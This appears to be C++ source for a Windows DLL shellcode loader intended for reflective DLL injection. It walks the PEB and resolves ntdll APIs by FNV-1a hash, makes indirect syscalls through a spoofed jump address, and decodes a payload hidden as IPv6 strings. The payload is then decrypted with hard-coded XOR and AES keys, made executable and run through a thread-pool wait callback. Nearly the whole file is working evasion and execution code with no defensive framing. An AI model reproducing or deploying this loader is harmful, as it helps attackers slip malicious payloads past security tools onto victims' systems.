
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#include "aes.h"
#include "aes.c"
#include "headstructs.h"
#include "payload.h"
#include <tlhelp32.h>
#include <string>

#pragma comment(lib, "Ntdll.lib")

#define FNV_PRIME 0x1000193
#define FNV_OFFSET_BASIS 0x811c9dc5


DWORD fnv1a_hash(const char* functionName) {
	DWORD hash = FNV_OFFSET_BASIS;
	while (*functionName) {
		hash ^= (BYTE)(*functionName++);
		hash *= FNV_PRIME;
	}
	return hash;
}

void xorDecrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
	for (size_t i = 0; i < payload_len; ++i) {
		payload[i] ^= key[i % key_len];
	}
}

BOOL DecodeIPv6Fuscation(const char* IPV6[], PVOID LpBaseAddress) {
	PCSTR Terminator = NULL;
	PVOID LpBaseAddress2 = NULL;
	LONG status;
	int i = 0;
	for (int j = 0; j < ElementsNumber; j++) {
		LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);
		status = RtlIpv6StringToAddressA((PCSTR)IPV6[j], &Terminator, (in6_addr*)LpBaseAddress2);
		if (status < 0) {
			return FALSE;
		}
		else {
			i = i + 16;
		}
	}
	return TRUE;
}

HMODULE GetModuleHandleReplacement(IN DWORD szModuleName) {
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

	PLIST_ENTRY pListHead = &pLdr->InLoadOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;

	while (pListEntry != pListHead) {
		PLDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (pDte->FullDllName.Length != 0) {
			int size_needed = WideCharToMultiByte(CP_ACP, 0, pDte->FullDllName.Buffer,
				pDte->FullDllName.Length / sizeof(WCHAR), NULL, 0, NULL, NULL);
			char* moduleName = new char[size_needed + 1];
			WideCharToMultiByte(CP_ACP, 0, pDte->FullDllName.Buffer,
				pDte->FullDllName.Length / sizeof(WCHAR), moduleName, size_needed, NULL, NULL);
			moduleName[size_needed] = '\0';

			for (int i = 0; moduleName[i]; ++i) {
				moduleName[i] = tolower(moduleName[i]);
			}

			char* baseName = strrchr(moduleName, '\\');
			if (baseName) baseName++;
			else baseName = moduleName;

			if (fnv1a_hash(baseName) == szModuleName) {
				delete[] moduleName;
				return (HMODULE)pDte->DllBase;
			}

			delete[] moduleName;
		}

		pListEntry = pListEntry->Flink;
	}

	return NULL;
}

PCHAR GetNtApiByHash(HMODULE hModule, DWORD functionHash) {
	if (!hModule) {
		printf("[!] Invalid module handle\n");
		return nullptr;
	}

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[!] Invalid DOS header\n");
		return nullptr;
	}

	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		printf("[!] Invalid NT header\n");
		return nullptr;
	}

	IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (exportDataDir.VirtualAddress == 0) {
		return nullptr;
	}

	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDataDir.VirtualAddress);
	DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);

	for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
		const char* functionName = (const char*)((BYTE*)hModule + addressOfNames[i]);
		if (fnv1a_hash(functionName) == functionHash) {
			return (PCHAR)functionName;
		}
	}

	return nullptr;
}


FARPROC GetAddrNT(HMODULE hModule, DWORD functionHash) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
	IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDataDir.VirtualAddress);

	DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
	DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
	WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
		const char* functionName = (const char*)((BYTE*)hModule + addressOfNames[i]);
		if (fnv1a_hash(functionName) == functionHash) {
			WORD functionOrdinal = addressOfNameOrdinals[i];
			return (FARPROC)((BYTE*)hModule + addressOfFunctions[functionOrdinal]);
		}
	}
	return nullptr;
}

void func() {
	unsigned char xorKey[] = { 0x5d, 0xff, 0x1b, 0xf9, 0x48, 0xf4, 0xcc, 0x4c, 0x5d, 0x77, 0xa7, 0xbd, 0x6f, 0xd7 };
	unsigned char aesKey[] = { 0x1f, 0xde, 0x8b, 0xb1, 0xec, 0xa6, 0xe5, 0xd8, 0x1f, 0x56, 0x37, 0xf5, 0xcb, 0x85, 0x53, 0xe6, 0x6c, 0x8f, 0xb5, 0x86, 0x79, 0xda, 0xb6, 0x19, 0x3d, 0x5e, 0x03, 0xea, 0xe2, 0x64, 0x4e, 0x32 };
	unsigned char aesIv[] = { 0x77, 0x7d, 0xa8, 0x9e, 0xca, 0xcb, 0x29, 0x1b, 0x94, 0xe9, 0x9d, 0x9a, 0xc1, 0xa4, 0xe7, 0x86 };

	HMODULE hNtdll = GetModuleHandleReplacement(0xa62a3b3b);
	LPVOID spoofJump = ((char*)GetAddrNT(hNtdll, 0x93834466)) + 18;
	HANDLE c = CreateEventA(NULL, FALSE, TRUE, NULL);
	DWORD SyscallId = 0;

	PVOID remoteMem = NULL;
	SIZE_T regionSize = SizeOfShellcode;
	GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xca67b978));
	setup(SyscallId, spoofJump);
	executioner((HANDLE)-1, &remoteMem, NULL, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// decode
	DecodeIPv6Fuscation(IPv6Shell, remoteMem);
	xorDecrypt((PBYTE)remoteMem, SizeOfShellcode, xorKey, sizeof(xorKey));
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, aesKey, aesIv);
	AES_CBC_decrypt_buffer(&ctx, (PBYTE)remoteMem, SizeOfShellcode);

	// change right
	ULONG oldProt;
	GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xbd799926));
	setup(SyscallId, spoofJump);
	executioner((HANDLE)-1, &remoteMem, &regionSize, PAGE_EXECUTE_READ, &oldProt);

	// Tạo Thread Pool Wait
	HANDLE hThread = NULL;
	pTpAllocWait TpAllocWait = (pTpAllocWait)GetAddrNT(hNtdll, 0x71977d6f);
	TpAllocWait((TP_WAIT**)&hThread, (PTP_WAIT_CALLBACK)remoteMem, NULL, NULL);

	// Kích hoạt Thread Pool Wait
	pTpSetWait TpSetWait = (pTpSetWait)GetAddrNT(hNtdll, 0x44072b26);
	TpSetWait((TP_WAIT*)hThread, c, NULL);

	// Chờ hoàn tất
	GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0xb073c52e));
	setup(SyscallId, spoofJump);
	executioner(c, 0, NULL);
	printf("check6\n");

	GetSyscallId(hNtdll, &SyscallId, GetNtApiByHash(hNtdll, 0x6b372c05));
	setup(SyscallId, spoofJump);
	executioner(hThread);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		MessageBoxA(NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK);
		func();
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}